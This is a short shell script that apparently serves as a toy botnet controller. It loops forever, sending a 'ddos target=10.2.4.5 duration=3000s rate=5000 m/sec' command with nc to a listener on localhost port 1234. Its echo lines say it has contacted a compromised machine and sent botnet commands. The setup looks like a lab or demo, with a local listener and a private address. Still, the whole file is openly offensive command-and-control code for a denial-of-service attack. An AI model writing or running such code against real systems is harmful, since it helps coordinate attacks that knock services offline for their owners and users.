#!/bin/sh

while true; do
    echo "Trying to contact compromised machine..."
    echo "ddos target=10.2.4.5 duration=3000s rate=5000 m/sec" | nc localhost 1234 && echo "**********Contacted compromised machine, sent botnet commands"
    sleep 5
done
